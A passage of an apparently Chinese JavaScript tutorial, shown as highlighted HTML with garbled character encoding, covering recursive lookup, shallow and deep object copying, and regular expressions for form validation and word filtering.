æˆ‘ä»¬æƒ³è¦å¾—é‡Œå±‚çš„æ•°æ® 11 12 å¯ä»¥åˆ©ç”¨é€’å½’å‡½æ•°</span></span><br><span class="line">            <span class="comment">// é‡Œé¢åº”è¯¥æœ‰goodsè¿™ä¸ªæ•°ç»„å¹¶ä¸”æ•°ç»„çš„é•¿åº¦ä¸ä¸º 0 </span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (item.goods &amp;&amp; item.goods.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            o = getID(item.goods, id);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æµ…æ‹·è´å’Œæ·±æ‹·è´"><a href="#æµ…æ‹·è´å’Œæ·±æ‹·è´" class="headerlink" title="æµ…æ‹·è´å’Œæ·±æ‹·è´"></a><strong>æµ…æ‹·è´å’Œæ·±æ‹·è´</strong></h2><ol><li><p>æµ…æ‹·è´åªæ˜¯æ‹·è´ä¸€å±‚, æ›´æ·±å±‚æ¬¡å¯¹è±¡çº§åˆ«çš„åªæ‹·è´å¼•ç”¨.</p></li><li><p>æ·±æ‹·è´æ‹·è´å¤šå±‚, æ¯ä¸€çº§åˆ«çš„æ•°æ®éƒ½ä¼šæ‹·è´.</p></li><li><p>Object.assign(<em>target</em>, â€¦<em>sources</em>)  es6 æ–°å¢æ–¹æ³•å¯ä»¥æµ…æ‹·è´</p><p><img src="https://i.loli.net/2021/06/07/A5Wr62mhoqZRbnp.jpg" alt="Snipaste_2021-06-07_14-33-37.jpg"></p></li></ol><h3 id="æµ…æ‹·è´"><a href="#æµ…æ‹·è´" class="headerlink" title="æµ…æ‹·è´"></a>æµ…æ‹·è´</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;andy&#x27;</span>,</span><br><span class="line">    <span class="attr">msg</span>: &#123;</span><br><span class="line">        <span class="attr">age</span>: <span class="number">18</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> o = &#123;&#125;;</span><br><span class="line"><span class="comment">// æ–¹æ³•ä¸€</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> k <span class="keyword">in</span> obj) &#123;</span><br><span class="line">    <span class="comment">// k æ˜¯å±æ€§å   obj[k] å±æ€§å€¼</span></span><br><span class="line">    o[k] = obj[k];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// æ–¹æ³•äºŒ ES6</span></span><br><span class="line"><span class="built_in">Object</span>.assign(o, obj);</span><br></pre></td></tr></table></figure><h3 id="æ·±æ‹·è´"><a href="#æ·±æ‹·è´" class="headerlink" title="æ·±æ‹·è´"></a>æ·±æ‹·è´</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ·±æ‹·è´æ‹·è´å¤šå±‚, æ¯ä¸€çº§åˆ«çš„æ•°æ®éƒ½ä¼šæ‹·è´.</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    <span class="attr">id</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;andy&#x27;</span>,</span><br><span class="line">    <span class="attr">msg</span>: &#123;</span><br><span class="line">        <span class="attr">age</span>: <span class="number">18</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">color</span>: [<span class="string">&#x27;pink&#x27;</span>, <span class="string">&#x27;red&#x27;</span>]</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> o = &#123;&#125;;</span><br><span class="line"><span class="comment">// å°è£…å‡½æ•° </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deepCopy</span>(<span class="params">newobj, oldobj</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> k <span class="keyword">in</span> oldobj) &#123;</span><br><span class="line">        <span class="comment">// åˆ¤æ–­æˆ‘ä»¬çš„å±æ€§å€¼å±äºé‚£ç§æ•°æ®ç±»å‹</span></span><br><span class="line">        <span class="comment">// 1. è·å–å±æ€§å€¼  oldobj[k]</span></span><br><span class="line">        <span class="keyword">var</span> item = oldobj[k];</span><br><span class="line">        <span class="comment">// 2. åˆ¤æ–­è¿™ä¸ªå€¼æ˜¯å¦æ˜¯æ•°ç»„</span></span><br><span class="line">        <span class="keyword">if</span> (item <span class="keyword">instanceof</span> <span class="built_in">Array</span>) &#123;</span><br><span class="line">            newobj[k] = [];</span><br><span class="line">            deepCopy(newobj[k], item)</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (item <span class="keyword">instanceof</span> <span class="built_in">Object</span>) &#123;</span><br><span class="line">            <span class="comment">// 3. åˆ¤æ–­è¿™ä¸ªå€¼æ˜¯å¦æ˜¯å¯¹è±¡</span></span><br><span class="line">            newobj[k] = &#123;&#125;;</span><br><span class="line">            deepCopy(newobj[k], item)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 4. å±äºç®€å•æ•°æ®ç±»å‹</span></span><br><span class="line">            newobj[k] = item;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">deepCopy(o, obj);</span><br></pre></td></tr></table></figure><hr><h1 id="æ­£åˆ™è¡¨è¾¾å¼"><a href="#æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼"></a>æ­£åˆ™è¡¨è¾¾å¼</h1><h2 id="æ¦‚è¿°-1"><a href="#æ¦‚è¿°-1" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p><strong>æ­£åˆ™è¡¨è¾¾å¼ï¼ˆ</strong> Regular Expression <strong>ï¼‰</strong>æ˜¯ç”¨äºåŒ¹é…å­—ç¬¦ä¸²ä¸­å­—ç¬¦ç»„åˆçš„æ¨¡å¼ã€‚åœ¨ JavaScriptä¸­ï¼Œæ­£åˆ™è¡¨è¾¾å¼ä¹Ÿæ˜¯å¯¹è±¡ã€‚</p><p>æ­£åˆ™è¡¨é€šå¸¸è¢«ç”¨æ¥æ£€ç´¢ã€æ›¿æ¢é‚£äº›ç¬¦åˆæŸä¸ªæ¨¡å¼ï¼ˆè§„åˆ™ï¼‰çš„æ–‡æœ¬ï¼Œä¾‹å¦‚éªŒè¯è¡¨å•ï¼šç”¨æˆ·åè¡¨å•åªèƒ½è¾“å…¥è‹±æ–‡å­—æ¯ã€æ•°å­—æˆ–è€…ä¸‹åˆ’çº¿ï¼Œ æ˜µç§°è¾“å…¥æ¡†ä¸­å¯ä»¥è¾“å…¥ä¸­æ–‡**(åŒ¹é…)<strong>ã€‚æ­¤å¤–ï¼Œæ­£åˆ™è¡¨è¾¾å¼è¿˜å¸¸ç”¨äºè¿‡æ»¤æ‰é¡µé¢å†…å®¹ä¸­çš„ä¸€äº›æ•æ„Ÿè¯</strong>(æ›¿æ¢)<strong>ï¼Œæˆ–ä»å­—ç¬¦ä¸²ä¸­è·å–æˆ‘ä»¬æƒ³è¦çš„ç‰¹å®šéƒ¨åˆ†</strong>(æå–)**ç­‰ ã€‚</p><p>å…¶ä»–è¯­è¨€ä¹Ÿä¼šä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ï¼Œæœ¬é˜¶æ®µæˆ‘ä»¬ä¸»è¦æ˜¯åˆ©ç”¨ JavaScript æ­£åˆ™è¡¨è¾¾å¼å®Œæˆè¡¨å•éªŒè¯ã€‚</p><h2 id="æ­£åˆ™è¡¨è¾¾å¼åœ¨-JavaScript-ä¸­çš„ä½¿ç”¨"><a href="#æ­£åˆ™è¡¨è¾¾å¼åœ¨-JavaScript-ä¸­çš„ä½¿ç”¨" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼åœ¨ JavaScript ä¸­çš„ä½¿ç”¨"></a><strong>æ­£åˆ™è¡¨è¾¾å¼</strong>åœ¨ <strong>JavaScript</strong> <strong>ä¸­çš„ä½¿ç”¨</strong></h2><h3 id="åˆ›å»ºæ­£åˆ™è¡¨è¾¾å¼"><a href="#åˆ›å»ºæ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="åˆ›å»ºæ­£åˆ™è¡¨è¾¾å¼"></a><strong>åˆ›å»ºæ­£åˆ™è¡¨è¾¾å¼</strong></h3><p><strong>1. é€šè¿‡è°ƒç”¨ RegExp å¯¹è±¡çš„æ„é€ å‡½æ•°åˆ›å»º</strong></p><p><code>var å˜é‡å = new RegExp(/è¡¨è¾¾å¼/ä¿®é¥°ç¬¦); </code></p><p><code>var å˜é‡å = new RegExp(&#39;è¡¨è¾¾å¼&#39;, &#39;ä¿®é¥°ç¬¦&#39;)</code></p><p><strong>2. é€šè¿‡å­—é¢é‡åˆ›å»º</strong>ï¼ˆæ­£åˆ™è¡¨è¾¾å¼ä¸éœ€è¦åŠ å¼•å·ï¼Œä¸ç®¡æ˜¯æ•°å­—å‹è¿˜æ˜¯å­—ç¬¦ä¸²å‹ï¼‰</p><p><code>var å˜é‡å = /è¡¨è¾¾å¼/ä¿®é¥°ç¬¦; </code></p><p>// æ³¨é‡Šä¸­é—´æ”¾è¡¨è¾¾å¼å°±æ˜¯æ­£åˆ™å­—é¢é‡</p><h3 id="æµ‹è¯•æ­£åˆ™è¡¨è¾¾å¼-test"><a href="#æµ‹è¯•æ­£åˆ™è¡¨è¾¾å¼-test" class="headerlink" title="æµ‹è¯•æ­£åˆ™è¡¨è¾¾å¼ test"></a><strong>æµ‹è¯•</strong>æ­£åˆ™è¡¨è¾¾å¼ <strong>test</strong></h3><p>test() æ­£åˆ™å¯¹è±¡æ–¹æ³•ï¼Œç”¨äºæ£€æµ‹å­—ç¬¦ä¸²æ˜¯å¦ç¬¦åˆè¯¥è§„åˆ™ï¼Œè¯¥å¯¹è±¡ä¼šè¿”å› true æˆ– falseï¼Œå…¶å‚æ•°æ˜¯æµ‹è¯•å­—ç¬¦ä¸²ã€‚</p><p> <code>regexObj.test(str)</code></p><ol><li><p>regexObj æ˜¯å†™çš„æ­£åˆ™è¡¨è¾¾å¼</p></li><li><p>str æˆ‘ä»¬è¦æµ‹è¯•çš„æ–‡æœ¬ï¼Œå°±æ˜¯æ£€æµ‹stræ–‡æœ¬æ˜¯å¦ç¬¦åˆæˆ‘ä»¬å†™çš„æ­£åˆ™è¡¨è¾¾å¼è§„èŒƒ.</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rg = <span class="regexp">/123/</span>;</span><br><span class="line"><span class="keyword">var</span> rg2 = <span class="regexp">/123/g</span>;</span><br><span class="line"><span class="built_in">console</span>.log(rg.test(<span class="number">123</span>));   <span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(rg.test(<span class="number">12123</span>));   <span class="comment">//true</span></span><br></pre></td></tr></table></figure><p>gï¼šå…¨å±€æ¨¡å¼ï¼ŒæŸ¥æ‰¾å­—ç¬¦ä¸²å…¨éƒ¨å†…å®¹ï¼Œå†æ¬¡åŒ¹é…æ—¶ä¼šå‘å‰æœç´¢ä¸‹ä¸€ä¸ªåŒ¹é…é¡¹</p><p>iï¼šä¸åŒºåˆ†å¤§å°å†™</p><p>mï¼šå¤šè¡Œæ¨¡å¼ï¼Œè¡¨ç¤ºæŸ¥æ‰¾åˆ°ä¸€è¡Œæœ«å°¾ä¼šç»§ç»­æŸ¥æ‰¾</p><p>yï¼šç²˜é™„æ¨¡å¼ï¼Œæ¯æ¬¡è°ƒç”¨<code>exec()</code>å°±åªä¼šåœ¨lastIndexçš„ä½ç½®ä¸Šå¯»æ‰¾åŒ¹é…å­—æ®µ</p><p>uï¼šUnicodeæ¨¡å¼</p><p>sï¼šdotAllæ¨¡å¼ï¼Œè¡¨ç¤ºå…ƒå­—ç¬¦ <code>.</code> å¯ä»¥åŒ¹é…ä»»ä½•å­—ç¬¦</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="string">&quot;address_address&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> rg = <span class="regexp">/a/g</span>;</span><br><span class="line"><span class="keyword">let</span> reg = <span class="keyword">new</span> <span class="built_in">RegExp</span>(a, <span class="string">&quot;g&quot;</span>)  <span class="comment">//åœ¨æ­£åˆ™ä¸­ä½¿ç”¨å˜é‡</span></span><br><span class="line">rg.test(<span class="string">&quot;å­—ç¬¦ä¸²&quot;</span>);             <span class="comment">//æ˜¯å¦åŒ…å«è¯¥å­—ç¬¦ä¸²ï¼Œè¿”å›å¸ƒå°”å€¼</span></span><br><span class="line"><span class="built_in">eval</span>(<span class="string">`/a<span class="subst">$&#123;a&#125;</span>/`</span>).test(<span class="string">&quot;å­—ç¬¦ä¸²&quot;</span>) <span class="comment">//åœ¨æ­£åˆ™ä¸­ä½¿ç”¨å˜é‡ + å…¶ä»–å­—ç¬¦</span></span><br><span class="line">a.match(rg);                  <span class="comment">//è¿”å›åŒ¹é…çš„å­—ç¬¦ä¸² + å…·ä½“ä¿¡æ¯ï¼Œè‹¥æ­£åˆ™å¯ç”¨å…¨å±€æ¨¡å¼ï¼Œåˆ™è¿”å›ä¸€ä¸ªæ•°ç»„ï¼ŒåŒ…å«æ‰€æœ‰åŒ¹é…çš„å­—ç¬¦ä¸²</span></span><br><span class="line">rg.exec(a);                   <span class="comment">//å’Œmatchå·®ä¸å¤šï¼Œåªä¸è¿‡ä¸å—å…¨å±€æ¨¡å¼çš„å½±å“ï¼Œå¦‚æœå¼€å…¨å±€æ¨¡å¼ï¼Œä¸‹æ¬¡å†åŒ¹é…ä¸€æ¬¡ï¼Œåˆ™ä»lastIndex</span></span><br><span class="line">                              <span class="comment">//å¼€å§‹åŒ¹é…ï¼Œåœ¨è¿™é‡Œä¹Ÿå°±æ˜¯ä» ä¸‹æ ‡ä¸º1çš„d å¼€å§‹åŒ¹é…</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„ç‰¹æ®Šå­—ç¬¦"><a href="#æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„ç‰¹æ®Šå­—ç¬¦" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„ç‰¹æ®Šå­—ç¬¦"></a><strong><strong>æ­£åˆ™è¡¨è¾¾å¼</strong></strong>ä¸­çš„ç‰¹æ®Šå­—ç¬¦</h2><h3 id="æ­£åˆ™è¡¨è¾¾å¼çš„ç»„æˆ"><a href="#æ­£åˆ™è¡¨è¾¾å¼çš„ç»„æˆ" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼çš„ç»„æˆ"></a><strong>æ­£åˆ™è¡¨è¾¾å¼çš„ç»„æˆ</strong></h3><p>ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼å¯ä»¥ç”±ç®€å•çš„å­—ç¬¦æ„æˆï¼Œæ¯”å¦‚ /abc/ï¼Œä¹Ÿå¯ä»¥æ˜¯ç®€å•å’Œç‰¹æ®Šå­—ç¬¦çš„ç»„åˆï¼Œæ¯”å¦‚ /ab*c/ ã€‚å…¶ä¸­ç‰¹æ®Šå­—ç¬¦ä¹Ÿè¢«ç§°ä¸ºå…ƒå­—ç¬¦ï¼Œåœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­æ˜¯å…·æœ‰ç‰¹æ®Šæ„ä¹‰çš„ä¸“ç”¨ç¬¦å·ï¼Œå¦‚ ^ ã€$ ã€+ ç­‰ã€‚</p><p>æ­£åˆ™è¡¨è¾¾å¼é€ŸæŸ¥è¡¨ï¼š<a href="https://www.runoob.com/regexp/regexp-metachar.html">https://www.runoob.com/regexp/regexp-metachar.html</a></p><p>æ­£åˆ™è¡¨è¾¾å¼åœ¨çº¿æµ‹è¯•ï¼š<a href="https://c.runoob.com/front-end/854">https://c.runoob.com/front-end/854</a></p><h3 id="è¾¹ç•Œç¬¦"><a href="#è¾¹ç•Œç¬¦" class="headerlink" title="è¾¹ç•Œç¬¦"></a><strong>è¾¹ç•Œç¬¦</strong></h3><p>æç¤ºå­—ç¬¦æ‰€å¤„çš„ä½ç½®</p><p><img src="https://i.loli.net/2021/06/07/Tzu9xCw2Hbd5GZN.jpg" alt="Snipaste_2021-06-07_15-08-33.jpg"></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rg = <span class="regexp">/^abc/</span>;</span><br><span class="line"><span class="built_in">console</span>.log(rg.test(<span class="string">&#x27;abcd&#x27;</span>));  <span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(rg.test(<span class="string">&#x27;babc&#x27;</span>));  <span class="comment">//false</span></span><br><span class="line"><span class="comment">//å¿…é¡»æ˜¯abc,ç±»ä¼¼å…¨ç­‰</span></span><br><span class="line"><span class="keyword">var</span> rg2 = <span class="regexp">/^abc$/</span>;</span><br><span class="line"><span class="built_in">console</span>.log(rg.test(<span class="string">&#x27;abcd&#x27;</span>));  <span class="comment">//false</span></span><br><span class="line"><span class="built_in">console</span>.log(rg.test(<span class="string">&#x27;abcabc&#x27;</span>));  <span class="comment">//false</span></span><br></pre></td></tr></table></figure><h3 id="å­—ç¬¦ç±»"><a href="#å­—ç¬¦ç±»" class="headerlink" title="å­—ç¬¦ç±»"></a><strong>å­—ç¬¦ç±»</strong></h3><p>**[]**è¡¨ç¤ºæœ‰ä¸€ç³»åˆ—å­—ç¬¦å¯ä¾›é€‰æ‹©ï¼Œåªè¦åŒ¹é…åˆ°å…¶ä¸­ä¸€ä¸ªå°±å¯ä»¥äº†</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rg = <span class="regexp">/[abc]/</span>;    <span class="comment">//åªè¦åŒ…å«æœ‰aæˆ–è€…bæˆ–è€…cå°±è¿”å›true</span></span><br><span class="line"><span class="built_in">console</span>.log(rg.test(<span class="string">&#x27;andy&#x27;</span>));  <span class="comment">//è¿”å›true</span></span><br><span class="line"><span class="comment">//var rg = /^[abc]$/ æ˜¯ä¸‰é€‰ä¸€ï¼Œåªæœ‰æ˜¯å•ä¸ªaæˆ–è€…bæˆ–è€…cæ‰è¿”å›true</span></span><br></pre></td></tr></table></figure><p>[][]<strong>[-]æ–¹æ‹¬å·å†…éƒ¨èŒƒå›´ç¬¦</strong>- ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rg = <span class="regexp">/^[a-z]$/</span>;   <span class="comment">//26ä¸ªè‹±æ–‡å°å†™å­—æ¯ä»»ä½•ä¸€ä¸ªå­—æ¯éƒ½è¿”å›true</span></span><br><span class="line"><span class="keyword">var</span> rg1 = <span class="regexp">/^[a-zA-Z]$/</span>;  <span class="comment">//26ä¸ªè‹±æ–‡å­—æ¯ä»»ä½•ä¸€ä¸ªå­—æ¯éƒ½è¿”å›true</span></span><br><span class="line"><span class="keyword">var</span> rg2 = <span class="regexp">/^[a-z0-9_-]$/</span>; <span class="comment">//ä»»ä½•å•ä¸ª26å°å†™å­—æ¯ï¼Œ0-9æ•°å­—ï¼Œ_, -,éƒ½è¿”å›true</span></span><br></pre></td></tr></table></figure><p><strong>[^]æ–¹æ‹¬å·å†…éƒ¨ å–åç¬¦^</strong> è¡¨ç¤ºå–åçš„æ„æ€ã€‚æ³¨æ„å’Œè¾¹ç•Œç¬¦ ^ åŒºåˆ«ï¼Œè¾¹ç•Œç¬¦å†™åˆ°æ–¹æ‹¬å·å¤–é¢ã€‚ </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rg = <span class="regexp">/^[^a-z]$/</span>;  <span class="comment">//26ä¸ªè‹±æ–‡å°å†™å­—æ¯ä»»ä½•ä¸€ä¸ªå­—æ¯éƒ½è¿”å›false</span></span><br></pre></td></tr></table></figure><p><strong>å­—ç¬¦ç»„åˆï¼š</strong>æ–¹æ‹¬å·å†…éƒ¨å¯ä»¥ä½¿ç”¨å­—ç¬¦ç»„åˆï¼Œè¿™é‡Œè¡¨ç¤ºåŒ…å« a åˆ° z çš„26ä¸ªè‹±æ–‡å­—æ¯å’Œ 1 åˆ° 9 çš„æ•°å­—éƒ½å¯ä»¥ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/[a-z1-<span class="number">9</span>]/.test(<span class="string">&#x27;andy&#x27;</span>)     <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h3 id="é‡è¯ç¬¦"><a href="#é‡è¯ç¬¦" class="headerlink" title="é‡è¯ç¬¦"></a><strong>é‡è¯ç¬¦</strong></h3><p>ç”¨æ¥è®¾å®šæŸä¸ªæ¨¡å¼å‡ºç°çš„æ¬¡æ•°ï¼Œæœ‰<code>*</code>ã€ <code>+</code>ã€ <code>ï¼Ÿ</code>ã€ <code>&#123;&#125;</code>ï¼Œ<code>&#123;&#125;</code>çš„é‡è¯é—´ä¸è¦æœ‰ç©ºæ ¼ï¼Œå¯ä»¥ç”¨testæ¥æ£€æµ‹ä¸‹æ–¹æ­£åˆ™è¡¨è¾¾å¼</p><p><img src="https://i.loli.net/2021/06/07/ZMGynQa5FsN6pVI.jpg" alt="Snipaste_2021-06-07_15-07-36.jpg"></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> rg = <span class="regexp">/^a*$/</span>;  <span class="comment">//aå¯ä»¥å‡ºç°0-næ¬¡ï¼Œn&gt;=0 </span></span><br><span class="line"><span class="keyword">var</span> rg1 = <span class="regexp">/^a+$/</span>; <span class="comment">//aå¯ä»¥å‡ºç°1-næ¬¡ï¼Œn&gt;=1</span></span><br><span class="line"><span class="keyword">var</span> rg2 = <span class="regexp">/^a?$/</span>; <span class="comment">//aå¯ä»¥å‡ºç°1æˆ–0æ¬¡ (?ä¹Ÿå¯ä»¥è¡¨ç¤ºç¦æ­¢è´ªå©ªï¼Œå¾€æœ€å°‘çš„åŒ¹é…æ–¹å¼å»é€‰æ‹©)</span></span><br><span class="line"><span class="keyword">var</span> rg3 = <span class="regexp">/^a&#123;3&#125;$/</span>; <span class="comment">//aåªèƒ½å¯ä»¥å‡ºç°3æ¬¡</span></span><br><span class="line"><span class="keyword">var</span> rg4 = <span class="regexp">/^a&#123;3,&#125;$/</span>; <span class="comment">//aåªå¯ä»¥å‡ºç°3-næ¬¡ n&gt;=3 </span></span><br><span class="line"><span class="keyword">var</span> rg5 = <span class="regexp">/^a&#123;3,16&#125;$/</span>; <span class="comment">//aåªå¯ä»¥å‡ºç°3-16æ¬¡</span></span><br><span class="line"><span class="comment">//æ™®éçš„ç”¨æˆ·åè§„å®šï¼š</span></span><br><span class="line"><span class="keyword">var</span> name = <span class="regexp">/^[a-zA-Z0-9_-]&#123;6, 16&#125;$/</span></span><br></pre></td></tr></table></figure><h3 id="ç”¨æˆ·åéªŒè¯æ¡ˆä¾‹"><a href="#ç”¨æˆ·åéªŒè¯æ¡ˆä¾‹" class="headerlink" title="ç”¨æˆ·åéªŒè¯æ¡ˆä¾‹"></a><strong>ç”¨æˆ·åéªŒè¯æ¡ˆä¾‹</strong></h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  é‡è¯æ˜¯è®¾å®šæŸä¸ªæ¨¡å¼å‡ºç°çš„æ¬¡æ•°</span></span><br><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/^[a-zA-Z0-9_-]&#123;6,16&#125;$/</span>; <span class="comment">// è¿™ä¸ªæ¨¡å¼ç”¨æˆ·åªèƒ½è¾“å…¥è‹±æ–‡å­—æ¯ æ•°å­— ä¸‹åˆ’çº¿ çŸ­æ¨ªçº¿ä½†æ˜¯æœ‰è¾¹ç•Œç¬¦å’Œ[] è¿™å°±é™å®šäº†åªèƒ½å¤šé€‰1</span></span><br><span class="line"><span class="keyword">var</span> uname = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;.uname&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> span = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;span&#x27;</span>);</span><br><span class="line">uname.onblur = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (reg.test(<span class="built_in">this</span>.value)) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;æ­£ç¡®çš„&#x27;</span>);</span><br><span class="line">        span.className = <span class="string">&#x27;right&#x27;</span>;</span><br><span class="line">        span.innerHTML = <span class="string">&#x27;ç”¨æˆ·åæ ¼å¼è¾“å…¥æ­£ç¡®&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;é”™è¯¯çš„&#x27;</span>);</span><br><span class="line">        span.className = <span class="string">&#x27;wrong&#x27;</span>;</span><br><span class="line">        span.innerHTML = <span class="string">&#x27;ç”¨æˆ·åæ ¼å¼è¾“å…¥ä¸æ­£ç¡®&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ‹¬å·æ€»ç»“"><a href="#æ‹¬å·æ€»ç»“" class="headerlink" title="æ‹¬å·æ€»ç»“"></a><strong>æ‹¬å·æ€»ç»“</strong></h3><ul><li><code>[]</code>ä¸­æ‹¬å·ï¼šå­—ç¬¦é›†åˆï¼ŒåŒ¹é…æ–¹æ‹¬å·ä¸­çš„ä»»æ„å­—ç¬¦</li><li><code>&#123;&#125;</code> å¤§æ‹¬å·ï¼šé‡è¯ç¬¦ï¼Œé‡Œé¢è¡¨ç¤ºé‡å¤æ¬¡æ•°ï¼Œä½†åªè®©å¤§æ‹¬å·å‰é¢ä¸€ä¸ªå­—ç¬¦é‡å¤ ï¼ˆæ³¨æ„ï¼š<code>/^abc&#123;3&#125;$/</code>ï¼Œåªè®©cé‡å¤ä¸‰æ¬¡ï¼Œå³abcccï¼‰</li><li><code>()</code> å°æ‹¬å·ï¼šè¡¨ç¤ºä¼˜å…ˆçº§ å¯ä»¥ç”¨æ¥ï¼š<code>/^(abc)&#123;3&#125;$/</code>ï¼Œè¡¨ç¤ºè®©abcé‡å¤ä¸‰æ¬¡ï¼Œå³abcabc</li></ul><h3 id="é¢„å®šä¹‰ç±»"><a href="#é¢„å®šä¹‰ç±»" class="headerlink" title="é¢„å®šä¹‰ç±»"></a>é¢„å®šä¹‰ç±»</h3><p>é¢„å®šä¹‰ç±»æŒ‡çš„æ˜¯æŸäº›å¸¸è§æ¨¡å¼çš„<strong>ç®€å†™æ–¹å¼</strong>ã€‚</p><p><img src="https://i.loli.net/2021/06/07/ARhQDZ6CXcrUuw1.jpg" alt="Snipaste_2021-06-07_14-59-12.jpg"></p><h2 id="æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„æ›¿æ¢"><a href="#æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„æ›¿æ¢" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„æ›¿æ¢"></a>æ­£åˆ™è¡¨è¾¾å¼ä¸­çš„æ›¿æ¢</h2><h3 id="replace-æ›¿æ¢"><a href="#replace-æ›¿æ¢" class="headerlink" title="replace æ›¿æ¢"></a><strong>replace</strong> <strong>æ›¿æ¢</strong></h3><p>replace() æ–¹æ³•å¯ä»¥å®ç°æ›¿æ¢å­—ç¬¦ä¸²æ“ä½œï¼Œç”¨æ¥æ›¿æ¢çš„å‚æ•°å¯ä»¥æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æˆ–æ˜¯ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼ã€‚</p><p>  <code>stringObject.replace(regexp/substr,replacement)</code></p><ol><li>ç¬¬ä¸€ä¸ªå‚æ•°:  è¢«æ›¿æ¢çš„å­—ç¬¦ä¸² æˆ–è€… æ­£åˆ™è¡¨è¾¾å¼</li><li>ç¬¬äºŒä¸ªå‚æ•°:  æ›¿æ¢ä¸ºçš„å­—ç¬¦ä¸²</li><li>è¿”å›å€¼æ˜¯ä¸€ä¸ªæ›¿æ¢å®Œæ¯•çš„æ–°å­—ç¬¦ä¸²</li></ol><p>ä½†æ˜¯replaceåªèƒ½æ›¿æ¢æ‰ç¬¬ä¸€ä¸ªåŒ¹é…çš„å­—ç¬¦/æ­£åˆ™è¡¨è¾¾å¼ï¼Œæ— æ³•æ»¡è¶³æ›¿æ¢æ‰å¤šä¸ªæ•æ„Ÿè¯</p><p>å¯ä»¥ä½¿ç”¨: <code>/è¡¨è¾¾å¼/[switch]</code> swtichä¹Ÿæˆä¸ºä¿®é¥°ç¬¦ï¼Œå³æŒ‰ç…§ä»€ä¹ˆæ ·çš„æ¨¡å¼æ¥åŒ¹é…</p><h3 id="æ•æ„Ÿè¯è¿‡æ¸¡æ¡ˆä¾‹"><a href="#æ•æ„Ÿè¯è¿‡æ¸¡æ¡ˆä¾‹" class="headerlink" title="æ•æ„Ÿè¯è¿‡æ¸¡æ¡ˆä¾‹"></a><strong>æ•æ„Ÿè¯è¿‡æ¸¡æ¡ˆä¾‹</strong></h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> text = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;textarea&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> btn = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;button&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;div&#x27;</span>);</span><br><span class="line">btn.onclick = <span 